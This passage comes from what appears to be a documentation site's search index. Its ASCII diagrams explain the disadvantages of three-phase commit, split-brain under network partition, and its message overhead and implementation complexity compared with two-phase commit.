\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#69-disadvantages-of-three-phase-commit","title":"6.9 Disadvantages of Three-Phase Commit","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         3PC DISADVANTAGES                               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u274c MORE COMPLEX THAN 2PC                             \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Additional phase adds complexity   \u2502            \u2502\n\u2502    \u2502 \u2022 More states to manage              \u2502            \u2502\n\u2502    \u2502 \u2022 Termination protocol needed        \u2502            \u2502\n\u2502    \u2502 \u2022 Harder to implement correctly      \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. \u274c HIGHER LATENCY                                    \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Message counts:                      \u2502            \u2502\n\u2502    \u2502 \u2022 2PC: 4N messages (4 rounds)        \u2502            \u2502\n\u2502    \u2502 \u2022 3PC: 6N messages (6 rounds) \ud83d\udcc8     \u2502            \u2502\n\u2502    \u2502                                      \u2502            \u2502\n\u2502    \u2502 Latency analysis (N=3 participants): \u2502            \u2502\n\u2502    \u2502 \u2022 2PC: ~35ms                         \u2502            \u2502\n\u2502    \u2502 \u2022 3PC: ~50ms (43% slower)            \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. \u274c VULNERABLE TO NETWORK PARTITIONS                  \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Assumes reliable failure detection \u2502            \u2502\n\u2502    \u2502 \u2022 Network partition can cause split- \u2502            \u2502\n\u2502    \u2502   brain scenarios                    \u2502            \u2502\n\u2502    \u2502 \u2022 Can violate consistency! \u26a0\ufe0f        \u2502            \u2502\n\u2502    \u2502 \u2022 NOT partition-tolerant (CAP)       \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 4. \u274c RARELY IMPLEMENTED IN PRACTICE                    \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Few database vendors support       \u2502            \u2502\n\u2502    \u2502 \u2022 Limited tooling/frameworks         \u2502            \u2502\n\u2502    \u2502 \u2022 Lack of production experience      \u2502            \u2502\n\u2502    \u2502 \u2022 No standard like XA for 2PC        \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 5. \u274c INCREASED FAILURE PROBABILITY                     \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 More phases = more failure points  \u2502            \u2502\n\u2502    \u2502 \u2022 More network messages can fail     \u2502            \u2502\n\u2502    \u2502 \u2022 Coordinator must survive 3 phases  \u2502            \u2502\n\u2502    \u2502 \u2022 Higher overall failure rate        \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 6. \u274c MORE LOGGING OVERHEAD                             \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Extra phase = extra log writes     \u2502            \u2502\n\u2502    \u2502 \u2022 PRE-COMMIT must be logged          \u2502            \u2502\n\u2502    \u2502 \u2022 More disk I/O                      \u2502            \u2502\n\u2502    \u2502 \u2022 Increased storage requirements     \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 7. \u274c STILL SYNCHRONOUS                                 \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Blocking during normal operation   \u2502            \u2502\n\u2502    \u2502 \u2022 Locks held for 3 phases            \u2502            \u2502\n\u2502    \u2502 \u2022 Cannot scale to large systems      \u2502            \u2502\n\u2502    \u2502 \u2022 Poor for high throughput           \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#610-problems-in-three-phase-commit","title":"6.10 Problems in Three-Phase Commit","text":"<p>Problem 1: Network Partition (Split-Brain)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 1: NETWORK PARTITION (CRITICAL!)          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Scenario: Network partition during Phase 2             \u2502\n\u2502                                                         \u2502\n\u2502 Timeline:                                               \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                                \u2502\n\u2502 t1    Coordinator sends PRE-COMMIT                      \u2502\n\u2502 t2    Partition A receives PRE-COMMIT                   \u2502\n\u2502 t3    \ud83d\udca5 NETWORK PARTITION \ud83d\udca5                           \u2502\n\u2502       (Splits coordinator + A from B + C)               \u2502\n\u2502                                                         \u2502\n\u2502 Network topology:                                       \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502  Partition 1        \u2571\u2571\u2571\u2571\u2571   Partition 2  \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502  Coordinator        \u2571\u2571\u2571\u2571\u2571   Participant C\u2502           \u2502\n\u2502 \u2502  Participant A      \u2571\u2571\u2571\u2571\u2571   Participant D\u2502           \u2502\n\u2502 \u2502  Participant B      \u2571\u2571\u2571\u2571\u2571                \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502  Received           \u2571\u2571\u2571\u2571\u2571   Did NOT      \u2502           \u2502\n\u2502 \u2502  PRE-COMMIT         \u2571\u2571\u2571\u2571\u2571   receive      \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Partition 1 (Coordinator + A + B):                      \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Received PRE-COMMIT                    \u2502           \u2502\n\u2502 \u2502 \u2022 State: PRE-COMMITTED                   \u2502           \u2502\n\u2502 \u2502 \u2022 Timeout waiting for C, D               \u2502           \u2502\n\u2502 \u2502 \u2022 Termination protocol runs              \u2502           \u2502\n\u2502 \u2502 \u2022 Decision: All in PRE-COMMIT \u2192 COMMIT   \u2502           \u2502\n\u2502 \u2502 \u2022 \u2705 COMMITS transaction                 \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Partition 2 (C + D):                                    \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Did NOT receive PRE-COMMIT             \u2502           \u2502\n\u2502 \u2502 \u2022 State: WAIT (after voting YES)         \u2502           \u2502\n\u2502 \u2502 \u2022 Timeout waiting for coordinator        \u2502           \u2502\n\u2502 \u2502 \u2022 Termination protocol runs              \u2502           \u2502\n\u2502 \u2502 \u2022 Decision: All in WAIT \u2192 ABORT          \u2502           \u2502\n\u2502 \u2502 \u2022 \u274c ABORTS transaction                  \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Result: INCONSISTENCY! \ud83d\udca3                               \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Partition 1: COMMITTED                   \u2502           \u2502\n\u2502 \u2502 Partition 2: ABORTED                     \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 \u2192 Split-brain scenario!                  \u2502           \u2502\n\u2502 \u2502 \u2192 Data inconsistency across nodes!       \u2502           \u2502\n\u2502 \u2502 \u2192 Atomicity violated! \u274c                 \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Why this happens:                                       \u2502\n\u2502 \u2022 3PC assumes synchronous network                       \u2502\n\u2502 \u2022 Assumes failures detectable (FLP impossibility)       \u2502\n\u2502 \u2022 Cannot distinguish slow vs dead vs partitioned        \u2502\n\u2502 \u2022 Timeout-based recovery makes guesses                  \u2502\n\u2502                                                         \u2502\n\u2502 This is why 3PC is rarely used in practice! \u26a0\ufe0f         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 2: Increased Message Complexity</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 2: MESSAGE OVERHEAD                       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Message Count Comparison:                               \u2502\n\u2502                                                         \u2502\n\u2502 For N participants:                                     \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 2PC:                                     \u2502           \u2502\n\u2502 \u2502 \u2022 Round 1: PREPARE (N messages)          \u2502           \u2502\n\u2502 \u2502 \u2022 Round 2: Votes (N responses)           \u2502           \u2502\n\u2502 \u2502 \u2022 Round 3: COMMIT/ABORT (N messages)     \u2502           \u2502\n\u2502 \u2502 \u2022 Round 4: ACKs (N responses)            \u2502           \u2502\n\u2502 \u2502 Total: 4N messages                       \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 3PC:                                     \u2502           \u2502\n\u2502 \u2502 \u2022 Round 1: CAN-COMMIT (N messages)       \u2502           \u2502\n\u2502 \u2502 \u2022 Round 2: Votes (N responses)           \u2502           \u2502\n\u2502 \u2502 \u2022 Round 3: PRE-COMMIT (N messages)       \u2502           \u2502\n\u2502 \u2502 \u2022 Round 4: ACKs (N responses)            \u2502           \u2502\n\u2502 \u2502 \u2022 Round 5: DO-COMMIT (N messages)        \u2502           \u2502\n\u2502 \u2502 \u2022 Round 6: ACKs (N responses)            \u2502           \u2502\n\u2502 \u2502 Total: 6N messages (50% more!)           \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Example (10 participants):                              \u2502\n\u2502 \u2022 2PC: 40 messages                                      \u2502\n\u2502 \u2022 3PC: 60 messages                                      \u2502\n\u2502 \u2022 Difference: 20 extra messages (50% overhead)          \u2502\n\u2502                                                         \u2502\n\u2502 Latency Impact (assuming 5ms RTT):                      \u2502\n\u2502 \u2022 2PC: 4 rounds \u00d7 5ms = 20ms network time               \u2502\n\u2502 \u2022 3PC: 6 rounds \u00d7 5ms = 30ms network time               \u2502\n\u2502 \u2022 Overhead: +50%                                        \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 3: Complexity and Bug-Prone Implementation</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 3: IMPLEMENTATION COMPLEXITY              \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 State Space Explosion:                                  \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Coordinator states:                      \u2502           \u2502\n\u2502 \u2502 \u2022 INIT                                   \u2502           \u2502\n\u2502 \u2502 \u2022 WAIT (for votes)                       \u2502           \u2502\n\u2502 \u2502 \u2022 PRE-COMMIT                             \u2502           \u2502\n\u2502 \u2502 \u2022 WAIT (for pre-commit ACKs)             \u2502           \u2502\n\u2502 \u2502 \u2022 DO-COMMIT                              \u2502           \u2502\n\u2502 \u2502 \u2022 WAIT (for commit ACKs)                 \u2502           \u2502\n\u2502 \u2502 \u2022 ABORT                                  \u2502           \u2502\n\u2502 \u2502 \u2022 END                                    \u2502           \u2502\n\u2502 \u2502 Total: 8 states (vs 5 in 2PC)            \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Edge Cases to Handle:                                   \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2713 Timeout in each phase                  \u2502           \u2502\n\u2502 \u2502 \u2713 Partial message delivery                \u2502           \u2502\n\u2502 \u2502 \u2713 Coordinator failure in each state       \u2502           \u2502\n\u2502 \u2502 \u2713 Participant failure in each state       \u2502           \u2502\n\u2502 \u2502 \u2713 Message reordering                      \u2502           \u2502\n\u2502 \u2502 \u2713 Network partition in each phase         \u2502           \u2502\n\u2502 \u2502 \u2713 Multiple simultaneous failures          \u2502           \u2502\n\u2502 \u2502 \u2713 Recovery and state reconstruction       \u2502           \u2502\n\u2502 \u2502 \u2713 Termination protocol                    \u2502           \u2502\n\u2502 \u2502 \u2713 Election of new coordinator             \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Result:                                                 \u2502\n\u2502 \u2022 Hard to implement correctly                           \u2502\n\u2502 \u2022 Subtle bugs in corner cases                           \u2502\n\u2502 \u2022 Difficult to test all scenarios                       \u2502\n\u2502 \u2022 Maintenance burden                                    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 4: Performance Under Normal Operation</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 4: PERFORMANCE DEGRADATION                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Throughput Comparison (100 transactions/sec):           \u2502\n\u2502                                                         \u2502\n\u2502 Local Transaction:                                      \u2502\n\u2502 \u2022 Latency: 2ms                                          \u2502\n\u2502 \u2022 Throughput: 500 TPS (max)                             \u2502\n\u2502                                                         \u2502\n\u2502 2PC:                                                    \u2502\n\u2502 \u2022 Latency: 35ms (network + logging)                     